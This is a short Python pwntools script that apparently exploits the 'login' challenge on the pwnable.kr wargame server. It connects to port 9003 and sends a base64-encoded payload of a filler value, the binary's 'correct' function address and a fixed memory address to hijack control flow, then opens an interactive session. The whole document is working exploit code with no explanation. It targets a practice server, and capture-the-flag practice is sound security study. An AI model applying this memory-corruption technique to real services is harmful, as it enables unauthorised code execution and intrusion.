from pwn import *
import base64

r=remote("pwnable.kr",9003)
b=ELF("./login")
correct=p32(b.symbols['correct'])
input=p32(0x811eb40)

pay=p32(0xDEADBEEF)+correct+input

r.sendline(base64.b64encode(pay))

r.interactive()
